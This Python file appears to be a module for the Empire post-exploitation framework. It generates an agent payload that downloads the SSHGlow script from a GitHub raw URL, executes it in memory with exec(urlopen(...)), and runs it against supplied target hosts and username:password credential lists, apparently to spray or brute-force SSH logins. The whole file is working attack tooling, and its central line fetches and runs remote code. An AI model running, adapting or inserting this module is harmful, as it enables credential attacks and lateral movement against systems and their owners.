from __future__ import print_function

from builtins import object
from builtins import str
from typing import Dict
from os.path import isfile

from empire.server.common.module_models import PydanticModule
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        targets = params['Targets']
        creds = params['Creds']
        delay = params['Delay']

        # if targets in file

        if isfile(targets):
            # convert file content to SSHGlow targets format 
            targets = open(targets,'r').read().strip().replace('\n',',')

        # if creds in file

        if isfile(creds):
            # convert file content to SSHGlow creds format like (user1:pass1,user2:pass2)
            creds = open(creds,'r').read().strip().replace('\n',',')


        # Code will load SSHGlow tool in memory and call run function
        # We had better use globals in exec function because empire agent will put our code in function and call it with reflection
        

        return f"""
            import urllib
            from urllib.request import urlopen
            try:
                exec(urlopen("https://raw.githubusercontent.com/abdallah-elsharif/sshglow/main/sshglow.py").read().decode("utf-8"),globals())
                run("{targets}","{creds}",delay={delay})
            except urllib.error.URLError:
                print("\033[0;31m[!]\033[0;37m We need internet access to load SSHGlow")
            except Exception as e:
                print("\033[0;31m[!]\033[0;37m Error occured -> ",e)
        """.replace('            ','')
